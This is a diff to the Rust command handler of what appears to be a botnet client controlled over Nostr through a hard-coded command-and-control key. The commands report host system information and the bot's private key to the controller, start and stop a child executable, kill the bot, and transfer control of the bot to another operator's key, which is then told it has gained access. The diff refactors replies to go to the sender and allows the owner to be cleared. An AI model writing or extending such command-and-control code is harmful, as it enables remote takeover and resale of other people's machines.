@@ -1,5 +1,3 @@
-use std::{fmt, os};
-
 use crate::bot::state::State;
 use nostr_sdk::prelude::*;
 
@@ -37,30 +35,28 @@ impl Commands {
             "help" => Some(Commands::Help(HelpCommand {})),
             "info" => Some(Commands::Sysinfo(SysInfoCommand {})),
             "kill" => Some(Commands::Kill(KillCommand {})),
-            "owner" => {
-                if let Some(arg) = args.get(0) {
-                    match ChangeOwnerCommand::new(arg) {
-                        Ok(cmd) => Some(Commands::ChangeOwner(cmd)),
-                        Err(_) => None,
-                    }
-                } else {
-                    None
-                }
-            }
+            "owner" => Some(Commands::ChangeOwner(
+                ChangeOwnerCommand::new(args.get(0).map(|arg| arg.to_string())).ok()?,
+            )),
             _ => None,
         }
     }
 
-    pub async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    pub async fn execute(
+        &self,
+        state: &mut State,
+        session: &Session,
+        pubkey: PublicKey,
+    ) -> Result<()> {
         match self {
-            Commands::HelloWorld(cmd) => cmd.execute(state, session).await,
-            Commands::Disable(cmd) => cmd.execute(state, session).await,
-            Commands::Enable(cmd) => cmd.execute(state, session).await,
-            Commands::PrivateKey(cmd) => cmd.execute(state, session).await,
-            Commands::Help(cmd) => cmd.execute(state, session).await,
-            Commands::Sysinfo(cmd) => cmd.execute(state, session).await,
-            Commands::Kill(cmd) => cmd.execute(state, session).await,
-            Commands::ChangeOwner(cmd) => cmd.execute(state, session).await,
+            Commands::HelloWorld(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::Disable(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::Enable(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::PrivateKey(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::Help(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::Sysinfo(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::Kill(cmd) => cmd.execute(state, session, pubkey).await,
+            Commands::ChangeOwner(cmd) => cmd.execute(state, session, pubkey).await,
         }
     }
 }
@@ -68,7 +64,12 @@ impl Commands {
 use crate::{CNC_PUB_KEY, session::Session};
 
 pub trait Command {
-    fn execute(&self, state: &mut State, session: &Session) -> impl Future<Output = Result<()>>;
+    fn execute(
+        &self,
+        state: &mut State,
+        session: &Session,
+        pubkey: PublicKey,
+    ) -> impl Future<Output = Result<()>>;
 }
 
 pub struct SysInfoCommand {}
@@ -87,7 +88,7 @@ fn format_size(size: u64) -> String {
 }
 
 impl Command for SysInfoCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
         use sysinfo::{Networks, System};
         let mut sys = System::new_all();
         sys.refresh_all();
@@ -133,9 +134,7 @@ impl Command for SysInfoCommand {
             ));
         }
 
-        session
-            .send_msg(&content, PublicKey::parse(CNC_PUB_KEY).unwrap())
-            .await?;
+        session.send_msg(&content, pubkey).await?;
 
         Ok(())
     }
@@ -144,10 +143,13 @@ impl Command for SysInfoCommand {
 pub struct HelloWorldCommand {}
 
 impl Command for HelloWorldCommand {
-    async fn execute(&self, _state: &mut State, session: &Session) -> Result<()> {
-        session
-            .send_msg("Hello World!", PublicKey::parse(CNC_PUB_KEY).unwrap())
-            .await?;
+    async fn execute(
+        &self,
+        _state: &mut State,
+        session: &Session,
+        pubkey: PublicKey,
+    ) -> Result<()> {
+        session.send_msg("Hello World!", pubkey).await?;
         Ok(())
     }
 }
@@ -155,16 +157,14 @@ impl Command for HelloWorldCommand {
 pub struct DisableCommand {}
 
 impl Command for DisableCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
         state.enabled = false;
         if let Some(ref mut child) = state.child {
             child.kill()?;
             state.child = None;
         }
         session.update_metadata(state.to_string().as_str()).await?;
-        session
-            .send_msg("I'm disabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
-            .await?;
+        session.send_msg("I'm disabled", pubkey).await?;
         Ok(())
     }
 }
@@ -172,7 +172,7 @@ impl Command for DisableCommand {
 pub struct EnabledCommand {}
 
 impl Command for EnabledCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
         state.enabled = true;
         if let Some(child) = &mut state.child {
             child.kill()?;
@@ -182,9 +182,7 @@ impl Command for EnabledCommand {
             state.child = Some(session.run_executable(path_buf));
         }
         session.update_metadata(state.to_string().as_str()).await?;
-        session
-            .send_msg("I'm enabled", PublicKey::parse(CNC_PUB_KEY).unwrap())
-            .await?;
+        session.send_msg("I'm enabled", pubkey).await?;
 
         Ok(())
     }
@@ -193,13 +191,10 @@ impl Command for EnabledCommand {
 pub struct RequestPrivateKeyCommand {}
 
 impl Command for RequestPrivateKeyCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
         let private_key = session.keys.secret_key().to_bech32()?;
         session
-            .send_msg(
-                &format!("This is my private key: {}", private_key),
-                PublicKey::parse(CNC_PUB_KEY).unwrap(),
-            )
+            .send_msg(&format!("This is my private key: {}", private_key), pubkey)
             .await?;
         Ok(())
     }
@@ -208,40 +203,43 @@ impl Command for RequestPrivateKeyCommand {
 pub struct KillCommand {}
 
 impl Command for KillCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
         if let Some(ref mut child) = state.child {
             child.kill()?;
             state.child = None;
         }
         state.enabled = false;
         session.update_metadata(state.to_string().as_str()).await?;
-        session
-            .send_msg("Shutting down...", PublicKey::parse(CNC_PUB_KEY).unwrap())
-            .await?;
+        session.send_msg("Shutting down...", pubkey).await?;
         std::process::exit(0);
     }
 }
 
 pub struct ChangeOwnerCommand {
-    npub: PublicKey,
+    npub: Option<PublicKey>,
 }
 
 impl ChangeOwnerCommand {
-    pub fn new(npub_str: &str) -> Result<Self> {
-        let npub = PublicKey::parse(npub_str)?;
+    pub fn new(npub_str: Option<String>) -> Result<Self> {
+        let npub = match npub_str {
+            Some(npub_str) => Some(PublicKey::parse(&npub_str)?),
+            None => None,
+        };
         Ok(ChangeOwnerCommand { npub })
     }
 }
 
 impl Command for ChangeOwnerCommand {
-    async fn execute(&self, state: &mut State, session: &Session) -> Result<()> {
-        state.owner = Some(self.npub);
+    async fn execute(&self, state: &mut State, session: &Session, pubkey: PublicKey) -> Result<()> {
+        state.owner = self.npub;
         session
-            .send_msg(
-                "Owner changed successfully.",
-                PublicKey::parse(CNC_PUB_KEY).unwrap(),
-            )
+            .send_msg("Owner changed successfully.", pubkey)
             .await?;
+        if let Some(npub) = self.npub {
+            session
+                .send_msg("You gained access to this bot.", npub)
+                .await?;
+        }
         Ok(())
     }
 }
@@ -249,7 +247,12 @@ impl Command for ChangeOwnerCommand {
 pub struct HelpCommand {}
 
 impl Command for HelpCommand {
-    async fn execute(&self, _state: &mut State, session: &Session) -> Result<()> {
+    async fn execute(
+        &self,
+        _state: &mut State,
+        session: &Session,
+        pubkey: PublicKey,
+    ) -> Result<()> {
         session
             .send_msg(
                 "Available commands:
@@ -260,8 +263,9 @@ impl Command for HelpCommand {
                     /private_key : Request the private key of the bot
                     /info : Display system information
                     /kill : Terminate the bot
+                    /owner <pubkey> : Change the owner of the bot (leave empty to remove owner)
                 ",
-                PublicKey::parse(CNC_PUB_KEY).unwrap(),
+                pubkey,
             )
             .await?;
         Ok(())
